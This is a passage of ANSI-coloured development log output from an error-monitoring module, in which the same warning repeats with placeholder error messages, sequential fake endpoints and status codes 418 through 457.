WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4418'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925599Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4419'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925648Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4420'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925697Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4421'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925786Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4422'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925898Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4423'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925969Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4424'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4425'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926078Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4426'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926132Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4427'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926185Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4428'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926292Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4429'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926361Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4430'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926416Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4431'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926472Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4432'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926522Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4433'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926570Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4434'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926619Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4435'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926667Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4436'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926715Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4437'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926764Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4438'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926812Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4439'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926859Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4440'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926907Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4441'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.926954Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4442'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927001Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4443'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927050Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4444'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927097Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4445'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4446'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927194Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4447'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927244Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4448'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4449'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927397Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4450'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927465Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4451'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927520Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4452'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927598Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4453'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927682Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4454'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927747Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4455'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927800Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4456'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.927850Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4457'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
